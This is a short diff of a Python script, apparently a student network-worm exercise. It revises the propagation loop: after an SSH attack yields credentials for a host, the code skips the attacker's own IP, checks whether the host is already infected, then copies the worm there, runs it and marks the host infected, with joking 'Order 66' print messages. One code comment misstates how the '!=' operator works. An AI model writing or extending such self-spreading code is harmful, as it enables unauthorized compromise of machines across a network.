@@ -275,18 +275,20 @@ for host in networkHosts:
 	
 	# For simplicity and ease of reading 
 	print("sshInfo:")
-
 	print sshInfo
 	
-	
-	# Did the attack succeed?
-	if sshInfo:
-		
-		print "Trying to spread"
-		
-		# Infect that system
-		spreadAndExecute(sshInfo[0])
-		
-		print "Spreading complete"	
-	
+
+	# Did said attack succed or not 
+	# replacing != with not as not just checked the memory source rather than whether the two variables are the same. 
+	if sshInfo and not host == sourceIP:
+		print("Execute order 66 (infection spreads)")
+
+		if not isInfectedSystem(sshInfo[0]):
+			spreadAndExecute(sshInfo[0])
+			markinfected(sshInfo[0])
+			print("The order is complete milord (infection complete)")
+		else:
+			print("The Jedi have won mlord (infection failed)")
+			
+
 
